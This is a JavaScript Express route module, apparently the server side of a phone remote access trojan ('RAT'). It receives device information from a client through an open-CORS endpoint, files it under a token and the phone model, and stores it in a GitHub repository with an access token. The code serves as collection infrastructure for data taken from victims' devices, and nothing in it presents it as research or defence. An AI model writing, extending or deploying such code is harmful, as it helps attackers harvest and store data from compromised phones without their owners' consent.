module.exports = function(app) {
    const axios = require('axios');
    const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
    const GITHUB_USER = 'daffaadev';
    const GITHUB_REPO = 'api';

    app.get('/rat/device/:token', async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');

        try {
            const { token } = req.params;
            const { q } = req.query;

            if (!token || !q) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            let deviceData;
            try {
                deviceData = JSON.parse(q);
            } catch (e) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            // 🔥 PAKE MODEL HP SEBAGAI NAMA FOLDER
            const deviceId = deviceData.model || deviceData.device || 'unknown';
            const filePath = `device/${token}/devices/${deviceId}/info.json`;

            let currentSha = null;
            let fileExists = false;

            try {
                const checkRes = await axios.get(
                    `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                    {
                        headers: {
                            'Authorization': `token ${GITHUB_TOKEN}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    }
                );
                fileExists = true;
                currentSha = checkRes.data.sha;
            } catch (e) {
                fileExists = false;
            }

            const formattedJson = JSON.stringify(deviceData, null, 2);
            const contentBase64 = Buffer.from(formattedJson).toString('base64');

            await axios.put(
                `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                {
                    message: fileExists ? `Update device ${deviceId}` : `Create device ${deviceId}`,
                    content: contentBase64,
                    sha: currentSha || undefined
                },
                {
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                }
            );

            res.status(200).json({
                success: true,
                message: fileExists ? 'Device updated.' : 'Device created.',
                device_id: deviceId
            });

        } catch (error) {
            res.status(500).json({
                success: false,
                message: 'Invalid parameters.'
            });
        }
    });
};
